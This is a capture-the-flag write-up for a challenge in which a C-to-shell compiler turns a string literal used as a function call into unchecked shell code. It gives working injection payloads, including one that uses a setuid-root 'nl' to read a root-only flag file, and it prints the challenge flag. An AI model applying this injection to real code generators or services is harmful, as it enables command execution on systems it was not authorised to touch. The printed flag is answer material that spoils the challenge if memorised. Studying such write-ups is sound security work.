# Paradise Nut

## Summary

The challenge exposes a service that asks for one line of C code, runs it through `pnut-sh.sh`, and then executes the generated shell script:

```sh
printf 'Enter your C code on a single line.\n> '
bash <(./pnut-sh.sh <(head -n1))
```

Inside the container, `/flag` is only readable by root, but `/usr/bin/nl` is setuid root:

```Dockerfile
RUN echo "$FLAG" > /flag
RUN chmod 400 /flag
RUN chmod u+s /usr/bin/nl
```

So the goal is not to read `/flag` directly. The goal is to make the generated shell script execute `nl /flag`.

## Root Cause

The bug is in the code generator for function calls.

`_comp_fun_call_code()` assumes the callee is a normal identifier, extracts its value, and turns it into a shell function name:

```sh
  _get_child name $node 0
  ...
  _get_val __t1 $name
  _function_name __t1 $__t1
```

That is already suspicious, because there is no validation that `name` is actually an identifier node.

`_function_name()` then prepends an underscore and emits the underlying symbol text:

```sh
_function_name() { let ident_tok $2
  _wrap_str_pool __t1 $ident_tok
  _string_concat $1 $((-__UNDERSCORE__)) $__t1
}
```

If the callee is a string literal expression instead of an identifier, the compiler still treats its internal symbol as if it were a function name. That means attacker-controlled string contents are copied directly into generated shell code.

## Turning It Into Command Injection

This C input:

```c
int main(){("=0;echo PWNED;#")();}
```

produces shell code like:

```sh
_main() {
  _=0;echo PWNED;# __
}
```

That is a straight shell injection primitive.

The leading `_=` is important. The generator always prepends `_` to the “function name”, so I used a payload that starts with `=0;` to make the first command a harmless variable assignment:

```sh
_=0;
```

After that, arbitrary shell commands can run.

## Exploit

The final one-line payload is:

```c
int main(){("=0;nl /flag;#")();}
```

Why it works:

1. The compiler accepts a string literal as the callee of a call expression.
2. The shell backend converts that string into a command name without checking its type.
3. The generated script executes `nl /flag`.
4. `nl` is setuid root in the container, so it can read `/flag`.

## Solver

The included `solve.py` opens a TLS connection, sends the payload, and prints the response.

Run it with:

```sh
python3 solve.py
```

## Flag

```text
GPNCTF{li8c_GETS()_fANs_kEEP_0n_WinnINg!_IsN't_17_cONv3n13N7_th47_REPLY_is_NOT_8laCkLIST3d?}
```
